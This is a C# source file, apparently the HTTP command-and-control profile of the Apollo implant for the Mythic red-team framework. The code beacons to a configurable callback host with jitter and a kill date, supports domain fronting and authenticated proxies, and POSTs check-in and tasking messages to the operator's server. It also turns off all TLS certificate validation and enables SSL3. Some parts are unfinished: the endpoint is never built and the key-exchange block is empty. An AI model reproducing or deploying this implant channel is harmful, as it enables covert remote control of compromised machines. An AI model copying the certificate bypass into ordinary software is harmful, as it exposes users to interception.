using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using ApolloInterop.Classes;
using ApolloInterop.Interfaces;
using ApolloInterop.Structs.MythicStructs;
using System.Net;
using System.IO;
using System.Runtime.Serialization.Json;

namespace HttpProfile
{
    public class HttpProfile : C2Profile, IC2Profile
    {
        private int CallbackInterval;
        private int CallbackJitter;
        private int CallbackPort;
        private string CallbackHost;
        private string PostUri;
        // synthesis of CallbackHost, CallbackPort, PostUri
        private string Endpoint;
        private bool EncryptedExchangeCheck;
        private string ProxyHost;
        private string ProxyPort;
        private string ProxyUser;
        private string ProxyPass;
        private string DomainFront;
        private string KillDate;
        private string UserAgent;
        // synthesis of ProxyHost and ProxyPort
        private string ProxyAddress;

        ICryptographySerializer Cryptor;

        public HttpProfile(Dictionary<string, string> data, ICryptographySerializer serializer) : base(data, serializer)
        {
            CallbackInterval = int.Parse(data["callback_interval"]) * 1000;
            CallbackJitter = int.Parse(data["callback_jitter"]);
            CallbackPort = int.Parse(data["callback_port"]);
            CallbackHost = data["callback_host"];
            PostUri = data["post_uri"];
            EncryptedExchangeCheck = data["encrypted_exchange_check"] == "T";
            ProxyHost = data["proxy_host"];
            ProxyPort = data["proxy_port"];
            if (!string.IsNullOrEmpty(ProxyPort))
            {
                ProxyAddress = string.Format("{0}:{1}", ProxyHost, ProxyPort);
            }
            else
            {
                ProxyAddress = ProxyHost;
            }
            ProxyUser = data["proxy_user"];
            ProxyPass = data["proxy_pass"];
            DomainFront = data["domain_front"];
            KillDate = data["killdate"];
            UserAgent = data["USER_AGENT"];

            // Disable certificate validation on web requests
            ServicePointManager.ServerCertificateValidationCallback = delegate { return true; };
            ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072 | SecurityProtocolType.Ssl3 | SecurityProtocolType.Tls;

            WebRequest.DefaultWebProxy = null;
            if (!string.IsNullOrEmpty(ProxyHost) &&
                !string.IsNullOrEmpty(ProxyUser) &&
                !string.IsNullOrEmpty(ProxyPass))
            {
                try
                {
                    Uri host = new Uri(ProxyHost);
                    ICredentials creds = new NetworkCredential(ProxyUser, ProxyPass);
                    WebRequest.DefaultWebProxy = new WebProxy(host, true, null, creds);
                } catch
                {
                    WebRequest.DefaultWebProxy = null;
                }
            }
        }


        private bool PostResponse(string message, out MessageResponse resp)
        {
            byte[] requestPayload = Encoding.UTF8.GetBytes(message);
            int retryCount = 0;
            while (retryCount < MAX_RETRIES)
            {
                try
                {
                    HttpWebRequest request = (HttpWebRequest)HttpWebRequest.Create(Endpoint);
                    request.KeepAlive = false;
                    request.Method = "Post";
                    request.ContentType = "text/plain";
                    request.ContentLength = requestPayload.Length;
                    request.UserAgent = UserAgent;
                    if (DomainFront != "" && DomainFront != "domain_front")
                        request.Host = DomainFront;
                    Stream reqStream = request.GetRequestStream();
                    reqStream.Write(requestPayload, 0, requestPayload.Length);
                    reqStream.Close();

                    WebResponse response = request.GetResponse();
                    using (StreamReader reader = new StreamReader(response.GetResponseStream()))
                    {
                        resp = Serializer.Deserialize<MessageResponse>(reader.ReadToEnd());
                    }
                    return true;
                } catch (Exception ex)
                { retryCount += 1; }
            }
            resp = new MessageResponse();
            return false;
        }

        public bool RegisterCallback(CheckinMessage checkinMsg, out string newUUID)
        {
            if (EncryptedExchangeCheck)
            {
                // This is where EKE code must live.
            }
            string msg = Serializer.Serialize(checkinMsg);
            if (PostResponse(msg, out MessageResponse resp))
            {
                Cryptor.UpdateUUID(resp.ID);
                newUUID = resp.ID;
                return true;
            }
            newUUID = null;
            return false;
        }

        public bool GetMessages(TaskingMessage msg, out MessageResponse resp)
        {
            string taskingMsg = Serializer.Serialize(msg);
            if (PostResponse(taskingMsg, out resp))
            {
                return true;
            }
            return false;
        }
    }
}
